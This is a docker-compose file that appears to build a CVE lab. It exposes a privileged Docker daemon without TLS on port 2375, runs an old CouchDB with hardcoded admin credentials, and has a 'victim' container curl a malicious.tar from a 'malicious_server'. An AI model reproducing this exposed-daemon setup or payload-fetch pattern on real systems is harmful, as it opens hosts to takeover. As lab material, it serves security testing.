services:
  vulnerable:
    image: docker:20.10-dind
    privileged: true
    environment:
      - DOCKER_TLS_CERTDIR=
    command: ["dockerd-entrypoint.sh", "--host=tcp://0.0.0.0:2375", "--tls=false"]
    ports:
      - "2375:2375"
    networks:
      - cve-net
    volumes:
      - vulnerable-docker:/var/lib/docker
    restart: unless-stopped

  malicious_server:
    build:
      context: ./malicious_server
    ports:
      - "8000:8000"
    networks:
      - cve-net

  victim:
    image: alpine:3.18
    depends_on:
      - vulnerable
      - malicious_server
      - couchdb
    environment:
      - DOCKER_HOST=tcp://vulnerable:2375
    networks:
      - cve-net
    command: ["sh", "-c", "apk add --no-cache curl docker && curl -s http://malicious_server:8000/malicious.tar -o /tmp/malicious.tar && echo 'Placeholder tar fetched; skipping docker load.' && sleep infinity"]

  couchdb:
    image: apache/couchdb:1.6.5
    environment:
      - COUCHDB_USER=admin
      - COUCHDB_PASSWORD=secret
    ports:
      - "5984:5984"
    networks:
      - cve-net
    restart: unless-stopped

  couchdb_init:
    image: alpine:3.18
    depends_on:
      - couchdb
    networks:
      - cve-net
    entrypoint: ["sh", "-c", "apk add --no-cache curl && \
      while ! curl -s http://couchdb:5984/ > /dev/null; do echo 'Waiting for CouchDB...'; sleep 2; done && \
      curl -X PUT http://admin:secret@couchdb:5984/testdb && \
      curl -X POST http://admin:secret@couchdb:5984/testdb -H 'Content-Type: application/json' -d '{\"_id\": \"doc1\", \"value\": \"sample\"}' && \
      echo 'Test database and document created.' && sleep infinity"]

networks:
  cve-net:
    driver: bridge

volumes:
  vulnerable-docker:
  docker-socket: